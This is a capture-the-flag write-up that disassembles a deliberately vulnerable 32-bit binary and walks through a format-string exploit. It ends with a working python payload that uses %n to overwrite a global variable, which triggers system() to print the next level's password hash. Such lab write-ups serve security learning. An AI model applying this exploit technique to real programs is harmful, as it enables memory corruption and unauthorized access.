# Level4

We can see that we have an executable file, which waits for input when launched, and which repeats what we have entered.

```
$ ls
level4
$ ./level4
test
test
```

We can see that ``main`` calls ``n`` and ``n`` calls ``p`` and ``system``.

```
$ objdump -d level4
08048444 <p>:
 8048444:       55                      push   %ebp
 8048445:       89 e5                   mov    %esp,%ebp
 8048447:       83 ec 18                sub    $0x18,%esp
 804844a:       8b 45 08                mov    0x8(%ebp),%eax
 804844d:       89 04 24                mov    %eax,(%esp)
 8048450:       e8 eb fe ff ff          call   8048340 <printf@plt>
 8048455:       c9                      leave
 8048456:       c3                      ret

08048457 <n>:
 8048457:       55                      push   %ebp
 8048458:       89 e5                   mov    %esp,%ebp
 804845a:       81 ec 18 02 00 00       sub    $0x218,%esp
 8048460:       a1 04 98 04 08          mov    0x8049804,%eax
 8048465:       89 44 24 08             mov    %eax,0x8(%esp)
 8048469:       c7 44 24 04 00 02 00    movl   $0x200,0x4(%esp)
 8048470:       00
 8048471:       8d 85 f8 fd ff ff       lea    -0x208(%ebp),%eax
 8048477:       89 04 24                mov    %eax,(%esp)
 804847a:       e8 d1 fe ff ff          call   8048350 <fgets@plt>
 804847f:       8d 85 f8 fd ff ff       lea    -0x208(%ebp),%eax
 8048485:       89 04 24                mov    %eax,(%esp)
 8048488:       e8 b7 ff ff ff          call   8048444 <p>
 804848d:       a1 10 98 04 08          mov    0x8049810,%eax
 8048492:       3d 44 55 02 01          cmp    $0x1025544,%eax
 8048497:       75 0c                   jne    80484a5 <n+0x4e>
 8048499:       c7 04 24 90 85 04 08    movl   $0x8048590,(%esp)
 80484a0:       e8 bb fe ff ff          call   8048360 <system@plt>
 80484a5:       c9                      leave
 80484a6:       c3                      ret

080484a7 <main>:
 80484a7:       55                      push   %ebp
 80484a8:       89 e5                   mov    %esp,%ebp
 80484aa:       83 e4 f0                and    $0xfffffff0,%esp
 80484ad:       e8 a5 ff ff ff          call   8048457 <n>
 80484b2:       c9                      leave
 80484b3:       c3                      ret
 80484b4:       90                      nop
 80484b5:       90                      nop
 80484b6:       90                      nop
 80484b7:       90                      nop
 80484b8:       90                      nop
 80484b9:       90                      nop
 80484ba:       90                      nop
 80484bb:       90                      nop
 80484bc:       90                      nop
 80484bd:       90                      nop
 80484be:       90                      nop
 80484bf:       90                      nop
```

We can see that ``system`` is called with the argument ``/bin/cat /home/user/level5/.pass``.

```
$ gdb ./level4
(gdb) b n
Breakpoint 1 at 0x8048460
(gdb) r
Starting program: /home/user/level4/level4

Breakpoint 1, 0x08048460 in n ()
(gdb) x/s 0x8048590
0x8048590:       "/bin/cat /home/user/level5/.pass"
```

For ``system`` to be called, this comparison must pass, the memory address ``0x8049810`` must be equal to ``0x1025544`` (16930116).

```
 804848d:       a1 10 98 04 08          mov    0x8049810,%eax
 8048492:       3d 44 55 02 01          cmp    $0x1025544,%eax
```

We can see that the ``p`` function uses the return value of ``fgets`` for its ``printf``, ``without checking``.

```
$ objdump -d level4
08048444 <p>:
 8048444:       55                      push   %ebp
 8048445:       89 e5                   mov    %esp,%ebp
 8048447:       83 ec 18                sub    $0x18,%esp
 804844a:       8b 45 08                mov    0x8(%ebp),%eax
 804844d:       89 04 24                mov    %eax,(%esp)
 8048450:       e8 eb fe ff ff          call   8048340 <printf@plt>
 8048455:       c9                      leave
 8048456:       c3                      ret
```

By the way, it is not possible to perform a ``buffer overflow attack`` on ``fgets``.
</br>
We can see that the program reserves (0x208) ``520 bytes`` for the buffer.
</br>
And ``fgets`` reads (0x200) ``512 bytes``.

```
 8048460:       a1 04 98 04 08          mov    0x8049804,%eax
 8048465:       89 44 24 08             mov    %eax,0x8(%esp)
 8048469:       c7 44 24 04 00 02 00    movl   $0x200,0x4(%esp)
 8048470:       00
 8048471:       8d 85 f8 fd ff ff       lea    -0x208(%ebp),%eax
 8048477:       89 04 24                mov    %eax,(%esp)
 804847a:       e8 d1 fe ff ff          call   8048350 <fgets@plt>
```

We can see that ``the return value`` of ``fgets`` is stored in ``the 12th position`` on ``the stack``.
</br>
AAAA = 0x41414141

```
$ ./level4
AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
AAAA.0xb7ff26b0.0xbffff784.0xb7fd0ff4.(nil).(nil).0xbffff748.0x804848d.0xbffff540.0x200.0xb7fd1ac0.0xb7ff37d0.0x41414141.0x2e70252e.0x252e7025
```

Since we can't use the buffer to write ``16930116`` via ``%n``, we'll use the padding from ``%d``.
</br>
``%n`` writes ``the number of characters displayed`` on the stack with ``12$``, we can move it to the 12th.
</br>
16930116 - 4 = 16930112

```
$ (python -c 'print("\x10\x98\x04\x08" + "%016930112d" + "%12$n")'; cat) | ./level4
...
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```